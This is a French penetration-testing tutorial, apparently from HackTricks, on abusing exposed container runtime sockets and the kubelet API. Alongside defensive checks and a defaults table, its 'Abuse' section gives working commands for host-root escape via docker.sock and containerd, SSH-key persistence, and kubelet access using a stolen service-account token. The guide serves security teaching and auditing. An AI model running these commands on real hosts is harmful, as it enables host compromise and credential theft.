# Exposition de l’API du runtime et du daemon

## Vue d’ensemble

De nombreuses compromissions réelles de containers ne commencent pas du tout par un namespace escape. Elles commencent par un accès au control plane du runtime. Si un workload peut communiquer avec `dockerd`, `containerd`, CRI-O, Podman ou kubelet via un socket Unix monté ou un listener TCP exposé, l’attaquant peut être en mesure de demander la création d’un nouveau container avec de meilleurs privilèges, de monter le système de fichiers de l’hôte, de rejoindre les namespaces de l’hôte ou de récupérer des informations sensibles sur le nœud. Dans ces cas, l’API du runtime constitue la véritable security boundary, et sa compromission revient pratiquement à compromettre l’hôte.

C’est pourquoi l’exposition des runtime sockets doit être documentée séparément des protections du kernel. Un container doté d’un seccomp, de capabilities et d’un confinement MAC ordinaires peut tout de même se trouver à un appel d’API de la compromission de l’hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l’intérieur. L’isolation du kernel du container actuel peut fonctionner exactement comme prévu, tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles d’accès au daemon

Docker Engine expose traditionnellement son API privilégiée via le socket Unix local `unix:///var/run/docker.sock`. Historiquement, elle a également été exposée à distance via des listeners TCP tels que `tcp://0.0.0.0:2375` ou un listener protégé par TLS sur le port `2376`. Exposer le daemon à distance sans TLS robuste ni authentification des clients transforme effectivement l’API Docker en interface root distante.

containerd, CRI-O, Podman et kubelet exposent des surfaces similaires à fort impact. Les noms et les workflows diffèrent, mais la logique reste la même. Si l’interface permet à l’appelant de créer des workloads, de monter des chemins de l’hôte, de récupérer des credentials ou de modifier des containers en cours d’exécution, l’interface constitue un canal de gestion privilégié et doit être traitée comme tel.

Les chemins locaux courants à vérifier sont :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciennes ou plus spécialisées peuvent également exposer des endpoints tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ils sont moins courants dans les environnements modernes, mais lorsqu'ils sont rencontrés, ils doivent être traités avec la même prudence, car ils représentent des surfaces de contrôle du runtime plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et, de préférence, par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L'ancienne habitude d'ouvrir le daemon Docker en HTTP non chiffré par commodité est l'une des erreurs les plus dangereuses de l'administration des conteneurs, car la surface d'API est suffisamment puissante pour créer directement des conteneurs privilégiés.

L'ancien modèle de configuration Docker ressemblait à ceci :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hôtes basés sur systemd, la communication avec le daemon peut également apparaître sous la forme `fd://`, ce qui signifie que le processus hérite d’un socket préouvert par systemd au lieu de l’associer directement lui-même. La leçon importante ne concerne pas la syntaxe exacte, mais la conséquence en matière de sécurité. Dès que le daemon écoute au-delà d’un socket local soumis à des permissions strictes, la sécurité du transport et l’authentification des clients deviennent obligatoires plutôt que de simples mesures de hardening.

## Abuse

Si un runtime socket est présent, confirmez lequel c’est, vérifiez si un client compatible existe et si un accès HTTP brut ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ces commandes sont utiles, car elles permettent de distinguer un chemin inexistant, un socket monté mais inaccessible et une API privilégiée active. Si le client fonctionne, la question suivante est de savoir si l’API peut lancer un nouveau container avec un host bind mount ou un partage de namespace de l’hôte.

### Lorsqu’aucun client n’est installé

L’absence de `docker`, `podman` ou d’un autre CLI convivial ne signifie pas que le socket est sécurisé. Docker Engine utilise HTTP via son socket Unix, et Podman expose à la fois une API compatible avec Docker et une API native Libpod via `podman system service`. Cela signifie qu’un environnement minimal disposant uniquement de `curl` peut tout de même suffire à piloter le daemon :
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Cela compte pendant la post-exploitation, car les défenseurs suppriment parfois les binaires client habituels, mais laissent le socket de gestion monté. Sur les hôtes Podman, n’oubliez pas que le chemin à forte valeur diffère entre les déploiements rootful et rootless : `unix:///run/podman/podman.sock` pour les instances de service rootful et `unix://$XDG_RUNTIME_DIR/podman/podman.sock` pour les instances rootless.

### Exemple complet : Docker Socket vers la racine de l’hôte

Si `docker.sock` est accessible, l’escape classique consiste à démarrer un nouveau conteneur qui monte le système de fichiers racine de l’hôte, puis à y effectuer un `chroot` :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela permet une exécution directe avec les privilèges root de l’hôte via le Docker daemon. L’impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau container, l’attaquant peut modifier les fichiers de l’hôte, récupérer des credentials, implanter une persistence ou démarrer des workloads supplémentaires avec des privilèges élevés.

### Exemple complet : Docker Socket vers les Namespaces de l’hôte

Si l’attaquant préfère entrer dans les namespaces plutôt que d’utiliser un accès limité au filesystem :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Cette voie atteint l’hôte en demandant au runtime de créer un nouveau container avec une exposition explicite des namespaces de l’hôte, plutôt qu’en exploitant celui qui existe déjà.

### Schéma de persistence via Docker Socket

Le contrôle du runtime peut également être utilisé pour la persistence au lieu d’un shell ponctuel. Le schéma générique consiste à créer un container auxiliaire avec un host mount, à écrire des éléments d’accès autorisés ou un startup hook dans le système de fichiers monté de l’hôte, puis à vérifier que l’hôte les prend en compte.

Exemple de forme :
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
La même idée peut cibler des unités systemd, des fragments cron, des fichiers de démarrage d’application ou des clés SSH, selon ce que l’opérateur souhaite démontrer. Le point important est que la modification persistante est effectuée via l’autorité du daemon runtime sur le système de fichiers de l’hôte, et non via des privilèges supplémentaires dans le conteneur d’origine.

### Raw Docker API Helper Pivot

Lorsque le Docker CLI est absent, le même flux d’aide avec montage de l’hôte peut être exécuté via HTTP sur le socket Unix. Le flux générique consiste à confirmer l’API, créer un conteneur d’aide avec un bind mount vers l’hôte, le démarrer, créer une instance exec, puis démarrer cet exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
La requête finale `/exec/<id>/start` dépend de l’ID exec renvoyé, mais le point de sécurité est indépendant de la plomberie JSON exacte : un accès direct à l’API d’un daemon Docker rootful suffit pour demander une charge de travail auxiliaire plus privilégiée.

### Exemple complet : socket containerd

Un socket `containerd` monté est généralement tout aussi dangereux :<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Si un client davantage similaire à Docker est présent, `nerdctl` peut être plus pratique que `ctr`, car il expose des options familières telles que `--privileged`, `--pid=host` et `-v` :
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
L’impact est à nouveau la compromission de l’hôte. Même si les outils spécifiques à Docker sont absents, une autre runtime API peut toujours offrir les mêmes privilèges d’administration. Sur les nœuds Kubernetes, `crictl` peut également suffire pour la reconnaissance et l’interaction avec les conteneurs, car il communique directement avec l’endpoint CRI.

### BuildKit Socket

`buildkitd` est facile à négliger, car on le considère souvent comme « simplement le backend de build », mais le daemon reste un control plane privilégié. Un `buildkitd.sock` accessible peut permettre à un attaquant d’exécuter des étapes de build arbitraires, d’inspecter les capacités des workers, d’utiliser des contextes locaux depuis l’environnement compromis et de demander des entitlements dangereux tels que `network.host` ou `security.insecure` lorsque le daemon a été configuré pour les autoriser.

Les premières interactions utiles sont les suivantes :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Si le daemon accepte des requêtes de build, testez si des entitlements non sécurisés sont disponibles :
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
L’impact exact dépend de la configuration du daemon, mais un service BuildKit rootful avec des entitlements permissifs n’est pas une simple commodité inoffensive pour les développeurs. Traitez-le comme une autre surface administrative de grande valeur, en particulier sur les CI runners et les nœuds de build partagés.

### API Kubelet via TCP

Le kubelet n’est pas un container runtime, mais il fait tout de même partie du plan de gestion du nœud et se trouve souvent dans le même périmètre de confiance. Si le port sécurisé `10250` du kubelet est accessible depuis le workload, ou si des identifiants de nœud, des kubeconfigs ou des droits de proxy sont exposés, l’attaquant peut être en mesure d’énumérer les Pods, de récupérer des logs ou d’exécuter des commandes dans des conteneurs locaux au nœud sans jamais passer par le chemin d’admission de l’API server Kubernetes.

Commencez par une découverte simple :
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Si le kubelet ou le chemin proxy de l’API-server autorise `exec`, un client capable de WebSocket peut transformer cela en exécution de code dans d’autres containers du node. C’est également pourquoi `nodes/proxy` avec uniquement la permission `get` est plus dangereux qu’il n’y paraît : la requête peut tout de même atteindre des endpoints du kubelet qui exécutent des commandes, et ces interactions directes avec le kubelet n’apparaissent pas dans les logs d’audit Kubernetes normaux.<sup>[[2]](#references)</sup>

## Vérifications

L’objectif de ces vérifications est de déterminer si le container peut atteindre un management plane qui aurait dû rester en dehors de la trust boundary.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Ce qui est intéressant ici :

- Un runtime socket monté constitue généralement une primitive administrative directe, et pas simplement une divulgation d’informations.
- Un listener TCP sur `2375` sans TLS doit être considéré comme une condition de remote compromise.
- Des variables d’environnement telles que `DOCKER_HOST` révèlent souvent que le workload a été intentionnellement conçu pour communiquer avec le runtime de l’hôte.

## Runtime Defaults

| Runtime / plateforme | État par défaut | Comportement par défaut | Affaiblissement manuel courant |
| --- | --- | --- | --- |
| Docker Engine | Unix socket local par défaut | `dockerd` écoute sur le socket local et le daemon est généralement rootful | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI daemonless par défaut | Aucun daemon privilégié persistant n’est requis pour l’utilisation locale ordinaire ; des API sockets peuvent toutefois être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution du service de manière trop large, utilisation d’une API rootful |
| containerd | Socket local privilégié | L’API administrative est exposée via le socket local et généralement utilisée par des outils de niveau supérieur | montage de `containerd.sock`, accès étendu à `ctr` ou `nerdctl`, exposition de namespaces privilégiés |
| CRI-O | Socket local privilégié | Le endpoint CRI est destiné aux composants de confiance locaux au node | montage de `crio.sock`, exposition du endpoint CRI à des workloads non fiables |
| Kubernetes kubelet | API de gestion locale au node | Kubelet ne devrait pas être largement accessible depuis les Pods ; l’accès peut exposer l’état des Pods, des credentials et des fonctionnalités d’exécution selon l’authn/authz | montage de sockets ou de certificats kubelet, auth kubelet faible, host networking avec endpoint kubelet accessible |

## References

- [1] [exploitation du socket containerd, partie 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Risques de contournement de l’API Server Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
